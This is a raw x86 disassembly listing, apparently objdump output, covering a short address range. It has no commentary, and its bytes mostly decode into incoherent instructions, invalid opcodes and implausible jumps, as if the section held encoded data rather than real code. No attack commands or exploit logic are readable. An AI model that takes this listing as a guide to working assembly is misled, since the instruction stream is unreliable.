  4061cb:	0c 0c                	or     $0xc,%al
  4061cd:	0e                   	push   %cs
  4061ce:	2e 0c 7c             	cs or  $0x7c,%al
  4061d1:	0c 39                	or     $0x39,%al
  4061d3:	66 e8 34 52          	callw  0xb40b
  4061d7:	96                   	xchg   %eax,%esi
  4061d8:	a3 26 3a 0e be       	mov    %eax,0xbe0e3a26
  4061dd:	a3 78 66 02 64       	mov    %eax,0x64026678
  4061e2:	d2 07                	rolb   %cl,(%edi)
  4061e4:	73 64                	jae    0x40624a
  4061e6:	3a c5                	cmp    %ch,%al
  4061e8:	80 e9 7b             	sub    $0x7b,%cl
  4061eb:	66 e9 93 20          	jmpw   0x8282
  4061ef:	53                   	push   %ebx
  4061f0:	68 64 52 ad af       	push   $0xafad5264
  4061f5:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  4061f9:	0c 79                	or     $0x79,%al
  4061fb:	67 68 64 6a 8e 48    	addr16 push $0x488e6a64
  406201:	7f 3a                	jg     0x40623d
  406203:	66 00 a2 fd 24 68 0e 	data16 add %ah,0xe6824fd(%edx)
  40620a:	3a 0e                	cmp    (%esi),%cl
  40620c:	2b 65 3a             	sub    0x3a(%ebp),%esp
  40620f:	66 97                	xchg   %ax,%di
  406211:	51                   	push   %ecx
  406212:	d2 eb                	shr    %cl,%bl
  406214:	29 64 d2 6f          	sub    %esp,0x6f(%edx,%edx,8)
  406218:	73 64                	jae    0x40627e
  40621a:	3a e6                	cmp    %dh,%ah
  40621c:	55                   	push   %ebp
  40621d:	e4 ab                	in     $0xab,%al
  40621f:	24 68                	and    $0x68,%al
  406221:	50                   	push   %eax
  406222:	4f                   	dec    %edi
  406223:	70 02                	jo     0x406227
  406225:	64 50                	fs push %eax
  406227:	67 00 2a             	add    %ch,(%bp,%si)
  40622a:	3b 66 68             	cmp    0x68(%esi),%esp
  40622d:	9b                   	fwait
  40622e:	0f 8e e5 25 3a 8e    	jle    0x8e7a8819
  406234:	84 7e 3a             	test   %bh,0x3a(%esi)
  406237:	66 83 70 50 66       	xorw   $0x66,0x50(%eax)
  40623c:	02 64 52 28          	add    0x28(%edx,%edx,2),%ah
  406240:	69 64 3a 99 5d 8c b7 	imul   $0x27b78c5d,-0x67(%edx,%edi,1),%esp
  406247:	27 
  406248:	68 8c ec 7c 68       	push   $0x687cec8c
  40624d:	64 50                	fs push %eax
  40624f:	66 97                	xchg   %ax,%di
  406251:	51                   	push   %ecx
  406252:	1a e8                	sbb    %al,%ch
  406254:	29 64 50 66          	sub    %esp,0x66(%eax,%edx,2)
  406258:	97                   	xchg   %eax,%edi
  406259:	51                   	push   %ecx
  40625a:	6a e9                	push   $0xffffffe9
  40625c:	2a 64 52 4a          	sub    0x4a(%edx,%edx,2),%ah
  406260:	69 64 3a 0c 5a 0e 2e 	imul   $0xc2e0e5a,0xc(%edx,%edi,1),%esp
  406267:	0c 
  406268:	12 0c 39             	adc    (%ecx,%edi,1),%cl
  40626b:	66 e8 34 52          	callw  0xb4a3
  40626f:	96                   	xchg   %eax,%esi
  406270:	a3 26 3a 0e be       	mov    %eax,0xbe0e3a26
  406275:	a3 78 66 02 64       	mov    %eax,0x64026678
  40627a:	d2 af 72 64 3a c5    	shrb   %cl,-0x3ac59b8e(%edi)
  406280:	18 f4                	sbb    %dh,%ah
  406282:	78 66                	js     0x4062ea
  406284:	e9 8b 8f 11 68       	jmp    0x6851f214
  406289:	64 50                	fs push %eax
  40628b:	66 97                	xchg   %ax,%di
  40628d:	51                   	push   %ecx
  40628e:	1a e8                	sbb    %al,%ch
  406290:	29 64 50 66          	sub    %esp,0x66(%eax,%edx,2)
  406294:	97                   	xchg   %eax,%edi
  406295:	51                   	push   %ecx
  406296:	6a e9                	push   $0xffffffe9
  406298:	2a 64 52 4a          	sub    0x4a(%edx,%edx,2),%ah
  40629c:	69 64 3a 0c 54 0e 2e 	imul   $0xe2e0e54,0xc(%edx,%edi,1),%esp
  4062a3:	0e 
  4062a4:	c6                   	(bad)
  4062a5:	64 3a 66 00          	cmp    %fs:0x0(%esi),%ah
  4062a9:	67 3a e6             	addr16 cmp %dh,%ah
  4062ac:	38 0c ca             	cmp    %cl,(%edx,%ecx,8)
  4062af:	ad                   	lods   %ds:(%esi),%eax
  4062b0:	2a 64 52 b0          	sub    -0x50(%edx,%edx,2),%ah
  4062b4:	af                   	scas   %es:(%edi),%eax
  4062b5:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  4062b9:	8c b0 7c 68 64 99    	mov    %?,-0x669b9784(%eax)
  4062bf:	7e e6                	jle    0x4062a7
  4062c1:	25 3a 00 af 21       	and    $0x21af003a,%eax
  4062c6:	c4 67 68             	les    0x68(%edi),%esp
  4062c9:	8f                   	(bad)
  4062ca:	52                   	push   %edx
  4062cb:	ef                   	out    %eax,(%dx)
  4062cc:	90                   	nop
  4062cd:	4d                   	dec    %ebp
  4062ce:	c2 ef af             	ret    $0xafef
  4062d1:	6b 8d 23 96 34 52 a7 	imul   $0xffffffa7,0x52349623(%ebp),%ecx
  4062d8:	af                   	scas   %es:(%edi),%eax
  4062d9:	26 3a eb             	es cmp %bl,%ch
  4062dc:	2d 80 6a 8e a8       	sub    $0xa88e6a80,%eax
  4062e1:	7f 3a                	jg     0x40631d
  4062e3:	66 e5 21             	in     $0x21,%ax
  4062e6:	de 36                	fidivs (%esi)
  4062e8:	02 64 52 25          	add    0x25(%edx,%edx,2),%ah
  4062ec:	69 64 3a 99 5d 14 aa 	imul   $0x24aa145d,-0x67(%edx,%edi,1),%esp
  4062f3:	24 
  4062f4:	68 8c 10 7c 68       	push   $0x687c108c
  4062f9:	64 35 d1 2d 9a b9    	fs xor $0xb99a2dd1,%eax
  4062ff:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406300:	6b 34 52 dc          	imul   $0xffffffdc,(%edx,%edx,2),%esi
  406304:	af                   	scas   %es:(%edi),%eax
  406305:	26 3a eb             	es cmp %bl,%ch
  406308:	2d 80 6a 8e fc       	sub    $0xfc8e6a80,%eax
  40630d:	7f 3a                	jg     0x406349
  40630f:	66 eb a0             	data16 jmp 0x4062b2
  406312:	22 eb                	and    %bl,%ch
  406314:	2d 80 6a 0c 68       	sub    $0x680c6a80,%eax
  406319:	0c 79                	or     $0x79,%al
  40631b:	67 68 64 c5 53 70    	addr16 push $0x7053c564
  406321:	ea 7b 66 80 9f 23 66 	ljmp   $0x6623,$0x9f80667b
  406328:	68 ed c2 57 90       	push   $0x9057c2ed
  40632d:	ed                   	in     (%dx),%eax
  40632e:	fd                   	std
  40632f:	00 97 21 c4 69 df    	add    %dl,-0x20963bdf(%edi)
  406335:	21 c4                	and    %eax,%esp
  406337:	e5 90                	in     $0x90,%eax
  406339:	69 46 e9 02 64 c5 53 	imul   $0x53c56402,-0x17(%esi),%eax
  406340:	48                   	dec    %eax
  406341:	ea 7b 66 02 64 c5 53 	ljmp   $0x53c5,$0x6402667b
  406348:	5c                   	pop    %esp
  406349:	eb 7b                	jmp    0x4063c6
  40634b:	66 02 74 52 e7       	data16 add -0x19(%edx,%edx,2),%dh
  406350:	68 64 3a 0c 06       	push   $0x60c3a64
  406355:	0c 2e                	or     $0x2e,%al
  406357:	67 68 64 52 66 68    	addr16 push $0x68665264
  40635d:	64 6a 0e             	fs push $0xe
  406360:	ca a3 78             	lret   $0x78a3
  406363:	66 00 9d fd 24 68 0e 	data16 add %bl,0xe6824fd(%ebp)
  40636a:	3a 8e b0 7d 3a 66    	cmp    0x663a7db0(%esi),%cl
  406370:	cb                   	lret
  406371:	00 aa 24 68 e5 cd    	add    %ch,-0x321a97dc(%edx)
  406377:	4a                   	dec    %edx
  406378:	14 64                	adc    $0x64,%al
  40637a:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  40637d:	9b                   	fwait
  40637e:	0f 46 e6             	cmovbe %esi,%esp
  406381:	25 3a 0c 68 9b       	and    $0x9b680c3a,%eax
  406386:	0f 52 e7             	rsqrtps %xmm7,%xmm4
  406389:	25 3a 0c 78 0e       	and    $0xe780c3a,%eax
  40638e:	5d                   	pop    %ebp
  40638f:	0e                   	push   %cs
  406390:	ef                   	out    %eax,(%dx)
  406391:	64 3a 66 00          	cmp    %fs:0x0(%esi),%ah
  406395:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406396:	3a 66 68             	cmp    0x68(%esi),%ah
  406399:	0c 3a                	or     $0x3a,%al
  40639b:	66 68 34 52          	pushw  $0x5234
  40639f:	f7 af 26 3a 0e 91    	imull  -0x6ef1c5da(%edi)
  4063a5:	a3 78 66 02 64       	mov    %eax,0x64026678
  4063aa:	d2 ff                	sar    %cl,%bh
  4063ac:	71 64                	jno    0x406412
  4063ae:	3a c5                	cmp    %ch,%al
  4063b0:	58                   	pop    %eax
  4063b1:	ed                   	in     (%dx),%eax
  4063b2:	7b 66                	jnp    0x40641a
  4063b4:	02 64 c5 53          	add    0x53(%ebp,%eax,8),%ah
  4063b8:	48                   	dec    %eax
  4063b9:	ea 7b 66 02 64 c5 53 	ljmp   $0x53c5,$0x6402667b
  4063c0:	5c                   	pop    %esp
  4063c1:	eb 7b                	jmp    0x40643e
  4063c3:	66 02 74 52 9b       	data16 add -0x65(%edx,%edx,2),%dh
  4063c8:	68 64 3a 0e c8       	push   $0xc80e3a64
  4063cd:	64 3a 66 02          	cmp    %fs:0x2(%esi),%ah
  4063d1:	00 52 66             	add    %dl,0x66(%edx)
  4063d4:	68 64 6a 0e 0a       	push   $0xa0e6a64
  4063d9:	a3 78 66 00 9d       	mov    %eax,0x9d006678
  4063de:	fd                   	std
  4063df:	24 68                	and    $0x68,%al
  4063e1:	0e                   	push   %cs
  4063e2:	3a 8e 08 7d 3a 66    	cmp    0x663a7d08(%esi),%cl
  4063e8:	cb                   	lret
  4063e9:	94                   	xchg   %eax,%esp
  4063ea:	b7 27                	mov    $0x27,%bh
  4063ec:	68 0e 3a 99 5d       	push   $0x5d993a0e
  4063f1:	44                   	inc    %esp
  4063f2:	b4 27                	mov    $0x27,%ah
  4063f4:	68 0e 3a 99 5d       	push   $0x5d993a0e
  4063f9:	50                   	push   %eax
  4063fa:	b5 27                	mov    $0x27,%ch
  4063fc:	68 0e 2a 0c 3e       	push   $0x3e0c2a0e
  406401:	0c 83                	or     $0x83,%al
  406403:	66 68 64 52          	pushw  $0x5264
  406407:	c6                   	(bad)
  406408:	68 64 3a 0e 68       	push   $0x680e3a64
  40640d:	64 3a 36             	cmp    %fs:(%esi),%dh
  406410:	00 31                	add    %dh,(%ecx)
  406412:	fd                   	std
  406413:	24 68                	and    $0x68,%al
  406415:	0c c3                	or     $0xc3,%al
  406417:	a1 2a 64 50 66       	mov    0x6650642a,%eax
  40641c:	80 43 23 66          	addb   $0x66,0x23(%ebx)
  406420:	68 c7 ba f4 2a       	push   $0x2af4bac7
  406425:	64 50                	fs push %eax
  406427:	66 97                	xchg   %ax,%di
  406429:	51                   	push   %ecx
  40642a:	1a e8                	sbb    %al,%ch
  40642c:	29 64 50 66          	sub    %esp,0x66(%eax,%edx,2)
  406430:	97                   	xchg   %eax,%edi
  406431:	51                   	push   %ecx
  406432:	0e                   	push   %cs
  406433:	e9 29 64 50 76       	jmp    0x7690c861
  406438:	00 80 3b 66 68 0c    	add    %al,0xc68663b(%eax)
  40643e:	dc 66 68             	fsubl  0x68(%esi)
  406441:	64 50                	fs push %eax
  406443:	78 00                	js     0x406445
  406445:	64 3a 66 38          	cmp    %fs:0x38(%esi),%ah
  406449:	0c 30                	or     $0x30,%al
  40644b:	a1 2a 64 52 9f       	mov    0x9f52642a,%eax
  406450:	af                   	scas   %es:(%edi),%eax
  406451:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  406455:	8c d4                	mov    %ss,%esp
  406457:	7e 68                	jle    0x4064c1
  406459:	64 99                	fs cltd
  40645b:	0a f8                	or     %al,%bh
  40645d:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  406461:	9b                   	fwait
  406462:	0f 46 e6             	cmovbe %esi,%esp
  406465:	25 3a 0c 68 9b       	and    $0x9b680c3a,%eax
  40646a:	0f 52 e7             	rsqrtps %xmm7,%xmm4
  40646d:	25 3a 0c 78 0c       	and    $0xc780c3a,%eax
  406472:	c7                   	(bad)
  406473:	66 68 64 52          	pushw  $0x5264
  406477:	99                   	cltd
  406478:	68 64 3a 0c 76       	push   $0x760c3a64
  40647d:	0c 3a                	or     $0x3a,%al
  40647f:	66 68 34 52          	pushw  $0x5234
  406483:	85 ae 26 3a 0e 91    	test   %ebp,-0x6ef1c5da(%esi)
  406489:	a3 78 66 02 64       	mov    %eax,0x64026678
  40648e:	d2 d3                	rcl    %cl,%bl
  406490:	70 64                	jo     0x4064f6
  406492:	3a c5                	cmp    %ch,%al
  406494:	e4 f6                	in     $0xf6,%al
  406496:	78 66                	js     0x4064fe
  406498:	02 64 c5 53          	add    0x53(%ebp,%eax,8),%ah
  40649c:	48                   	dec    %eax
  40649d:	ea 7b 66 02 64 c5 53 	ljmp   $0x53c5,$0x6402667b
  4064a4:	38 eb                	cmp    %ch,%bl
  4064a6:	78 66                	js     0x40650e
  4064a8:	02 7c 52 e4          	add    -0x1c(%edx,%edx,2),%bh
  4064ac:	68 64 3a 0c 45       	push   $0x450c3a64
  4064b1:	0e                   	push   %cs
  4064b2:	2e 0e                	cs push %cs
  4064b4:	68 64 ba 36 00       	push   $0x36ba64
  4064b9:	e4 ab                	in     $0xab,%al
  4064bb:	24 68                	and    $0x68,%al
  4064bd:	0c e4                	or     $0xe4,%al
  4064bf:	a0 2a 64 52 66       	mov    0x6652642a,%al
  4064c4:	6a 64                	push   $0x64
  4064c6:	3a 8e 14 7c 3a 66    	cmp    0x663a7c14(%esi),%cl
  4064cc:	cb                   	lret
  4064cd:	78 bf                	js     0x40648e
  4064cf:	26 68 e5 cd 79 50    	es push $0x5079cde5
  4064d5:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  4064d9:	9b                   	fwait
  4064da:	0f 46 e6             	cmovbe %esi,%esp
  4064dd:	25 3a 0c 68 9b       	and    $0x9b680c3a,%eax
  4064e2:	0f 36                	(bad)
  4064e4:	e7 26                	out    %eax,$0x26
  4064e6:	3a 0c 70             	cmp    (%eax,%esi,2),%cl
  4064e9:	0e                   	push   %cs
  4064ea:	12 0c 2e             	adc    (%esi,%ebp,1),%cl
  4064ed:	0e                   	push   %cs
  4064ee:	2e 0e                	cs push %cs
  4064f0:	68 64 ba 36 00       	push   $0x36ba64
  4064f5:	94                   	xchg   %eax,%esp
  4064f6:	f1                   	int1
  4064f7:	24 68                	and    $0x68,%al
  4064f9:	0c e4                	or     $0xe4,%al
  4064fb:	a0 2a 64 52 66       	mov    0x6652642a,%al
  406500:	6a 64                	push   $0x64
  406502:	3a 8e 28 7c 3a 66    	cmp    0x663a7c28(%esi),%cl
  406508:	cb                   	lret
  406509:	70 b4                	jo     0x4064bf
  40650b:	27                   	daa
  40650c:	68 0e 3a 99 5d       	push   $0x5d993a0e
  406511:	44                   	inc    %esp
  406512:	b4 27                	mov    $0x27,%ah
  406514:	68 0e 3a 99 5d       	push   $0x5d993a0e
  406519:	34 b5                	xor    $0xb5,%al
  40651b:	24 68                	and    $0x68,%al
  40651d:	0e                   	push   %cs
  40651e:	22 0c 0c             	and    (%esp,%ecx,1),%cl
  406521:	0e                   	push   %cs
  406522:	65 0c 7c             	gs or  $0x7c,%al
  406525:	0c 3a                	or     $0x3a,%al
  406527:	66 e8 34 52          	callw  0xb75f
  40652b:	96                   	xchg   %eax,%esi
  40652c:	a3 26 3a 0e b6       	mov    %eax,0xb60e3a26
  406531:	a2 78 66 00 64       	mov    %al,0x64006678
  406536:	38 66 68             	cmp    %ah,0x68(%esi)
  406539:	8c 30                	mov    %?,(%eax)
  40653b:	7e 68                	jle    0x4065a5
  40653d:	64 99                	fs cltd
  40653f:	6a e6                	push   $0xffffffe6
  406541:	25 3a 0c 68 9b       	and    $0x9b680c3a,%eax
  406546:	0f 46 e6             	cmovbe %esi,%esp
  406549:	25 3a 0c 68 9b       	and    $0x9b680c3a,%eax
  40654e:	0f 52 e7             	rsqrtps %xmm7,%xmm4
  406551:	25 3a 0c 7f 0c       	and    $0xc7f0c3a,%eax
  406556:	a1 66 68 64 52       	mov    0x52646866,%eax
  40655b:	26 69 64 3a 0c 76 0c 	imul   $0x663a0c76,%es:0xc(%edx,%edi,1),%esp
  406562:	3a 66 
  406564:	e8 34 52 a6 ae       	call   0xaee6b79d
  406569:	26 3a 0e             	cmp    %es:(%esi),%cl
  40656c:	bf a2 78 66 02       	mov    $0x26678a2,%edi
  406571:	64 d2 b7 7f 64 3a c5 	shlb   %cl,%fs:-0x3ac59b81(%edi)
  406578:	ec                   	in     (%dx),%al
  406579:	f6 78 66             	idivb  0x66(%eax)
  40657c:	02 64 50 64          	add    0x64(%eax,%edx,2),%ah
  406580:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  406584:	02 61 50             	add    0x50(%ecx),%ah
  406587:	67 02 64 50          	add    0x50(%si),%ah
  40658b:	66 02 64 52 f6       	data16 add -0xa(%edx,%edx,2),%ah
  406590:	69 64 3a 0c 68 0e 3a 	imul   $0xc3a0e68,0xc(%edx,%edi,1),%esp
  406597:	0c 
  406598:	6e                   	outsb  %ds:(%esi),(%dx)
  406599:	0e                   	push   %cs
  40659a:	2a 8e 7c 7c 3a 66    	sub    0x663a7c7c(%esi),%cl
  4065a0:	e1 a2                	loope  0x406544
  4065a2:	bb a1 42 02 3a       	mov    $0x3a0242a1,%ebx
  4065a7:	66 02 65 6c          	data16 add 0x6c(%ebp),%ah
  4065ab:	0c 58                	or     $0x58,%al
  4065ad:	9b                   	fwait
  4065ae:	0f 8e e5 25 3a 8e    	jle    0x8e7a8b99
  4065b4:	04 73                	add    $0x73,%al
  4065b6:	3a 66 02             	cmp    0x2(%esi),%ah
  4065b9:	65 6c                	gs insb (%dx),%es:(%edi)
  4065bb:	0c 58                	or     $0x58,%al
  4065bd:	9b                   	fwait
  4065be:	0f 16 f8             	movlhps %xmm0,%xmm7
  4065c1:	26 3a 8e 34 73 3a 66 	cmp    %es:0x663a7334(%esi),%cl
  4065c8:	02 65 6c             	add    0x6c(%ebp),%ah
  4065cb:	0c 58                	or     $0x58,%al
  4065cd:	9b                   	fwait
  4065ce:	0f 7e e6             	movd   %mm4,%esi
  4065d1:	25 3a 8e 24 73       	and    $0x73248e3a,%eax
  4065d6:	3a 66 02             	cmp    0x2(%esi),%ah
  4065d9:	65 6c                	gs insb (%dx),%es:(%edi)
  4065db:	0c 58                	or     $0x58,%al
  4065dd:	9b                   	fwait
  4065de:	0f 7a                	(bad)
  4065e0:	ed                   	in     (%dx),%eax
  4065e1:	24 3a                	and    $0x3a,%al
  4065e3:	8e 54 73 3a          	mov    0x3a(%ebx,%esi,2),%ss
  4065e7:	66 e9 8b f2          	jmpw   0x5876
  4065eb:	50                   	push   %eax
  4065ec:	68 64 50 67 3e       	push   $0x3e675064
  4065f1:	0e                   	push   %cs
  4065f2:	0a 99 5d 70 b4 27    	or     0x27b4705d(%ecx),%bl
  4065f8:	68 8c 1c 71 68       	push   $0x68711c8c
  4065fd:	64 50                	fs push %eax
  4065ff:	67 3e 0e             	addr16 ds push %cs
  406602:	0a 99 5d 68 b4 27    	or     0x27b4685d(%ecx),%bl
  406608:	68 8c 2c 71 68       	push   $0x68712c8c
  40660d:	64 50                	fs push %eax
  40660f:	67 3e 0e             	addr16 ds push %cs
  406612:	0a 99 5d 00 aa 24    	or     0x24aa005d(%ecx),%bl
  406618:	68 8c 3c 71 68       	push   $0x68713c8c
  40661d:	64 b3 9e             	fs mov $0x9e,%bl
  406620:	9f                   	lahf
  406621:	83 b3 23 80 ed fd 0c 	xorl   $0xc,-0x2127fdd(%ebx)
  406628:	69 32 50 56 97 51    	imul   $0x51975650,(%edx),%esi
  40662e:	0a ef                	or     %bh,%ch
  406630:	29 64 d2 8b          	sub    %esp,-0x75(%edx,%edx,8)
  406634:	7e 64                	jle    0x40669a
  406636:	3a 0c 69             	cmp    (%ecx,%ebp,2),%cl
  406639:	32 50 56             	xor    0x56(%eax),%dl
  40663c:	97                   	xchg   %eax,%edi
  40663d:	51                   	push   %ecx
  40663e:	ca eb 29             	lret   $0x29eb
  406641:	64 d2 bb 7e 64 3a 0c 	sarb   %cl,%fs:0xc3a647e(%ebx)
  406648:	69 32 50 56 97 51    	imul   $0x51975650,(%edx),%esi
  40664e:	ba f4 2a 64 d2       	mov    $0xd2642af4,%edx
  406653:	ab                   	stos   %eax,%es:(%edi)
  406654:	7e 64                	jle    0x4066ba
  406656:	3a 0c 69             	cmp    (%ecx,%ebp,2),%cl
  406659:	32 50 56             	xor    0x56(%eax),%dl
  40665c:	97                   	xchg   %eax,%edi
  40665d:	51                   	push   %ecx
  40665e:	be f4 2a 64 d2       	mov    $0xd2642af4,%esi
  406663:	db 7e 64             	fstpt  0x64(%esi)
  406666:	3a 0c 94             	cmp    (%esp,%edx,4),%cl
  406669:	9b                   	fwait
  40666a:	0f 8e e5 25 3a 8e    	jle    0x8e7a8c55
  406670:	34 72                	xor    $0x72,%al
  406672:	3a 66 cb             	cmp    -0x35(%esi),%ah
  406675:	44                   	inc    %esp
  406676:	bf 26 68 0c de       	mov    $0xde0c6826,%edi
  40667b:	11 28                	adc    %ebp,(%eax)
  40667d:	64 50                	fs push %eax
  40667f:	9a 97 51 d2 eb 29 64 	lcall  $0x6429,$0xebd25197
  406686:	d2 37                	shlb   %cl,(%edi)
  406688:	7e 64                	jle    0x4066ee
  40668a:	3a e7                	cmp    %bh,%ah
  40668c:	af                   	scas   %es:(%edi),%eax
  40668d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40668e:	77 66                	ja     0x4066f6
  406690:	68 0e c6 99 5d       	push   $0x5d99c60e
  406695:	14 aa                	adc    $0xaa,%al
  406697:	24 68                	and    $0x68,%al
  406699:	8c 08                	mov    %cs,(%eax)
  40669b:	70 68                	jo     0x406705
  40669d:	64 99                	fs cltd
  40669f:	4e                   	dec    %esi
  4066a0:	e6 25                	out    %al,$0x25
  4066a2:	3a 0e                	cmp    (%esi),%cl
  4066a4:	8c 13                	mov    %ss,(%ebx)
  4066a6:	7a 66                	jp     0x40670e
  4066a8:	02 98 c5 53 18 f4    	add    -0xbe7ac3b(%eax),%bl
  4066ae:	78 66                	js     0x406716
  4066b0:	80 43 2c 66          	addb   $0x66,0x2c(%ebx)
  4066b4:	68 0e c6 99 5d       	push   $0x5d99c60e
  4066b9:	7c b4                	jl     0x40666f
  4066bb:	27                   	daa
  4066bc:	68 8c 34 70 68       	push   $0x6870348c
  4066c1:	64 99                	fs cltd
  4066c3:	76 e6                	jbe    0x4066ab
  4066c5:	25 3a 0e 8c 13       	and    $0x138c0e3a,%eax
  4066ca:	7a 66                	jp     0x406732
  4066cc:	02 98 c5 53 70 ea    	add    -0x158fac3b(%eax),%bl
  4066d2:	7b 66                	jnp    0x40673a
  4066d4:	80 67 2c 66          	andb   $0x66,0x2c(%edi)
  4066d8:	68 0e c6 99 5d       	push   $0x5d99c60e
  4066dd:	78 bf                	js     0x40669e
  4066df:	26 68 8c d0 73 68    	es push $0x6873d08c
  4066e5:	64 99                	fs cltd
  4066e7:	66 e8 24 3a          	callw  0xa10f
  4066eb:	0e                   	push   %cs
  4066ec:	8c 13                	mov    %ss,(%ebx)
  4066ee:	7a 66                	jp     0x406756
  4066f0:	02 98 c5 53 74 e1    	add    -0x1e8bac3b(%eax),%bl
  4066f6:	7a 66                	jp     0x40675e
  4066f8:	80 bb 2f 66 68 0e c6 	cmpb   $0xc6,0xe68662f(%ebx)
  4066ff:	99                   	cltd
  406700:	5d                   	pop    %ebp
  406701:	70 b4                	jo     0x4066b7
  406703:	27                   	daa
  406704:	68 8c fc 73 68       	push   $0x6873fc8c
  406709:	64 99                	fs cltd
  40670b:	0e                   	push   %cs
  40670c:	f8                   	clc
  40670d:	26 3a 0e             	cmp    %es:(%esi),%cl
  406710:	8c 13                	mov    %ss,(%ebx)
  406712:	7a 66                	jp     0x40677a
  406714:	02 98 c5 53 7c ea    	add    -0x1583ac3b(%eax),%bl
  40671a:	7b 66                	jnp    0x406782
  40671c:	80 df 2f             	sbb    $0x2f,%bh
  40671f:	66 68 ed c2          	pushw  $0xc2ed
  406723:	91                   	xchg   %eax,%ecx
  406724:	8f                   	(bad)
  406725:	ed                   	in     (%dx),%eax
  406726:	7f 82                	jg     0x4066aa
  406728:	e1 a3                	loope  0x4066cd
  40672a:	50                   	push   %eax
  40672b:	9a 97 51 36 e8 29 64 	lcall  $0x6429,$0xe8365197
  406732:	d2 ff                	sar    %cl,%bh
  406734:	7d 64                	jge    0x40679a
  406736:	3a c5                	cmp    %ch,%al
  406738:	44                   	inc    %esp
  406739:	ed                   	in     (%dx),%eax
  40673a:	7a 66                	jp     0x4067a2
  40673c:	00 80 4d 26 68 0e    	add    %al,0xe68264d(%eax)
  406742:	c6                   	(bad)
  406743:	99                   	cltd
  406744:	5d                   	pop    %ebp
  406745:	68 b4 27 68 8c       	push   $0x8c6827b4
  40674a:	b4 73                	mov    $0x73,%ah
  40674c:	68 64 65 38 33       	push   $0x33386564
  406751:	ad                   	lods   %ds:(%esi),%eax
  406752:	f9                   	stc
  406753:	33 e1                	xor    %ecx,%esp
  406755:	81 b9 8a 74 37 6c 31 	cmpl   $0x349ad731,0x6c37748a(%ecx)
  40675c:	d7 9a 34 
  40675f:	1d 19 ed c2 91       	sbb    $0x91c2ed19,%eax
  406764:	8f                   	(bad)
  406765:	ed                   	in     (%dx),%eax
  406766:	7f 8a                	jg     0x4066f2
  406768:	e1 a3                	loope  0x40670d
  40676a:	50                   	push   %eax
  40676b:	66 00 e4             	data16 add %ah,%ah
  40676e:	3a 66 68             	cmp    0x68(%esi),%ah
  406771:	0e                   	push   %cs
  406772:	39 0c 68             	cmp    %ecx,(%eax,%ebp,2)
  406775:	0e                   	push   %cs
  406776:	39 0e                	cmp    %ecx,(%esi)
  406778:	68 64 3a e6 97       	push   $0x97e63a64
  40677d:	11 32                	adc    %esi,(%edx)
  40677f:	8e 8c 77 3a 66 e1 a2 	mov    -0x5d1e99c6(%edi,%esi,2),%cs
  406786:	b9 98 97 6b be       	mov    $0xbe6b9798,%ecx
  40678b:	f1                   	int1
  40678c:	68 64 3a de e3       	push   $0xe3de3a64
  406791:	2d 3a 66 9f 83       	sub    $0x839f663a,%eax
  406796:	b3 23                	mov    $0x23,%bl
  406798:	80 ed fd             	sub    $0xfd,%ch
  40679b:	0c 68                	or     $0x68,%al
  40679d:	32 d2                	xor    %dl,%dl
  40679f:	b3 7a                	mov    $0x7a,%bl
  4067a1:	64 3a ef             	fs cmp %bh,%ch
  4067a4:	ab                   	stos   %eax,%es:(%edi)
  4067a5:	32 d2                	xor    %dl,%dl
  4067a7:	97                   	xchg   %eax,%edi
  4067a8:	7a 64                	jp     0x40680e
  4067aa:	3a e5                	cmp    %ch,%ah
  4067ac:	0d 98 3a a1 2d       	or     $0x2da13a98,%eax
  4067b1:	90                   	nop
  4067b2:	3e 66 68 64 b7       	ds pushw $0xb764
  4067b7:	23 98 34 b7 23 9c    	and    -0x63dc48cc(%eax),%ebx
  4067bd:	34 b7                	xor    $0xb7,%al
  4067bf:	23 94 34 c5 13 78 0c 	and    0xc7813c5(%esp,%esi,1),%edx
  4067c6:	d8 c6                	fadd   %st(6),%st
  4067c8:	2a 64 52 67          	sub    0x67(%edx,%edx,2),%ah
  4067cc:	68 64 ba 8e 90       	push   $0x908eba64
  4067d1:	cf                   	iret
  4067d2:	c5 99 eb a0 22 5f    	lds    0x5f22a0eb(%ecx),%ebx
  4067d8:	35 98 49 2c 02       	xor    $0x22c4998,%eax
  4067dd:	64 c5 13             	lds    %fs:(%ebx),%edx
  4067e0:	94                   	xchg   %eax,%esp
  4067e1:	0c 81                	or     $0x81,%al
  4067e3:	a0 2a 64 52 db       	mov    0xdb52642a,%al
  4067e8:	ae                   	scas   %es:(%edi),%al
  4067e9:	26 3a 99 1d 68 c5 13 	cmp    %es:0x13c5681d(%ecx),%bl
  4067f0:	60                   	pusha
  4067f1:	8c db                	mov    %ds,%ebx
  4067f3:	8a 97 9b b9 a2 70    	mov    0x70a2b99b(%edi),%dl
  4067f9:	ed                   	in     (%dx),%eax
  4067fa:	7f 9e                	jg     0x40679a
  4067fc:	61                   	popa
  4067fd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4067fe:	4e                   	dec    %esi
  4067ff:	40                   	inc    %eax
  406800:	02 60 50             	add    0x50(%eax),%ah
  406803:	62 e5 21             	(bad) {%k2}{z}
  406806:	c2 36 97             	ret    $0x9736
  406809:	11 2a                	adc    %ebp,(%edx)
  40680b:	0e                   	push   %cs
  40680c:	8a c4                	mov    %ah,%al
  40680e:	78 66                	js     0x406876
  406810:	00 65 3a             	add    %ah,0x3a(%ebp)
  406813:	66 e8 8c 14          	callw  0x7ca3
  406817:	cd 97                	int    $0x97
  406819:	9b                   	fwait
  40681a:	b9 a2 70 ed c2       	mov    $0xc2ed70a2,%ecx
  40681f:	91                   	xchg   %eax,%ecx
  406820:	8f                   	(bad)
  406821:	ed                   	in     (%dx),%eax
  406822:	7f 82                	jg     0x4067a6
  406824:	e1 a3                	loope  0x4067c9
  406826:	65 38 33             	cmp    %dh,%gs:(%ebx)
  406829:	ad                   	lods   %ds:(%esi),%eax
  40682a:	f9                   	stc
  40682b:	33 e1                	xor    %ecx,%esp
  40682d:	81 6b 31 d7 8a 12 74 	subl   $0x74128ad7,0x31(%ebx)
  406834:	71 ed                	jno    0x406823
  406836:	c2 4f 90             	ret    $0x904f
